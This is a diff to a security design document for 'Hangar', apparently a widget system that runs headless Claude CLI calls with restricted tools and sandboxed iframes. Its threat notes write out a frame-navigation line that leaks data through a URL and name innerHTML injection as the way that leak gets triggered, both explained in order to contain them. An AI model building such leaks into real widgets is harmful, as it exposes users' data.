@@ -192,8 +192,9 @@ the reason, and writing one through the API succeeds with a warning saying it ca
 The prompt (params substituted) runs as a headless one-shot:
 
 ```
-claude -p "<prompt>" --model <model> --tools "" --allowedTools <tools…>
+claude -p --model <model> --tools "" --allowedTools <tools…> --permission-mode default
        --output-format json --json-schema <schema> --settings '{"disableAllHooks":true}'
+       --no-session-persistence          (the prompt on stdin)
 ```
 
 with `HANGAR_SESSION_ID`, `HANGAR_HOOK_TOKEN` and `HANGAR_URL` removed from its environment, and
@@ -203,8 +204,13 @@ its working directory set to a scratch folder rather than the repo. Each of thos
   that opened the widget, and that session's state flips to idle and back on every refresh.
   (`--bare` would skip hooks too, but it accepts only API-key auth, and Hangar runs on the user's
   OAuth login.)
-- **`--tools ""` and an allowlist.** The run can call exactly the MCP tools the manifest names, and
-  no built-in tool: no shell, no file writes. A denied call fails the fetch; it does not prompt.
+- **`--tools ""`, an allowlist and `--permission-mode default`.** The run can call the MCP tools the
+  manifest names, and no built-in tool: no shell, no file writes. The mode is explicit so that a
+  `defaultMode` in the user's settings (`acceptEdits`, `bypassPermissions`) cannot widen it; headless,
+  a tool not allowed is denied, not asked (verified 2026-11-18: the call shows in
+  `permission_denials`). An allow rule the user wrote for an MCP tool still applies — it is theirs.
+  (`--setting-sources ""` would drop those too, but it drops the claude.ai connectors with them, and
+  `dontAsk` mode left the allowlisted connector unusable.)
 - **`--json-schema`.** The answer arrives as `structured_output`, already validated, so the view
   never parses prose.
 
@@ -259,9 +265,16 @@ Repo widgets read the same values: the repo says what it needs, each person supp
 `sandbox="allow-scripts"` with **no** `allow-same-origin`, so the document has an opaque origin, no
 cookies and no bearer token. On top of that it is served with
 `Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'; style-src
-'unsafe-inline'; img-src data:` — **it cannot reach the network at all**. All network access
-happens in the data source, on the server. A view Claude wrote badly, or a repo view written to
-leak, has nowhere to send anything.
+'unsafe-inline'; img-src data:` — **it can make no network request**. All network access
+happens in the data source, on the server.
+
+One way out remains, and no policy inside a frame closes it: the view can navigate its own frame
+(`location = "https://…?" + data`), carrying what it holds in the URL. Hangar cannot stop that, so it
+contains it: the bridge reports `pagehide` before the view's own code can interfere, and the page
+then sends that frame nothing more, accepts nothing from it, and mounts the view afresh (three times
+in ten seconds and it is stopped). What a navigation could carry is what the view was already given.
+That is the reason the guide insists views build their DOM with `textContent`: the realistic way
+a view comes to navigate is a ticket title or a commit message pasted into `innerHTML`.
 
 It talks to Hangar only through `postMessage`, wrapped in a small `hangar` object Hangar injects:
 
@@ -414,11 +427,18 @@ for changes, and close it when you're done. **Edit…** on an instance does the 
 
 ## 10. Security, in one place
 
-- The view has no origin, no token and no network (§7). Data reaches it only through `postMessage`.
+- The view has no origin, no token and makes no network request (§7). Data reaches it only through
+  `postMessage`; a view that navigates itself away is cut off and remounted. `toChat` is honoured
+  only straight after a click in the view, so a view cannot fill the message box on its own.
 - A Node source runs without `HANGAR_HOOK_TOKEN`; a Claude source runs without any `HANGAR_*`
-  variable, without hooks, with no built-in tools, and with only the MCP tools its manifest names.
-- Secrets are entered in a Hangar form, stored encrypted per node, handed only to Node sources, and
-  never returned by any API, including the test call (§6.5).
+  variable, without hooks, with no built-in tools, in `default` permission mode, and with only the
+  MCP tools its manifest names (plus any the user's own settings allow).
+- A forced refresh this soon after the last one (60 s for a Claude source, 5 s for Node) gets that
+  one's data: a view calling `refresh()` in a loop cannot turn into a model call after another.
+- Secrets are entered in a Hangar form, stored encrypted per node and handed only to Node sources.
+  No API reads one back; a value a script prints is masked out of the test call, the data and its
+  errors — best effort, since the session writing the script could encode one past the mask, and is
+  trusted to the same degree as it is to run code here at all (§6.5).
 - Actions are declared, their arguments validated, and writes confirmed by Hangar outside the frame.
 - Repo widgets run only once approved, and again after any change to their files (§4).
 - Writing widgets needs nothing a session doesn't already have. A session can already run any code
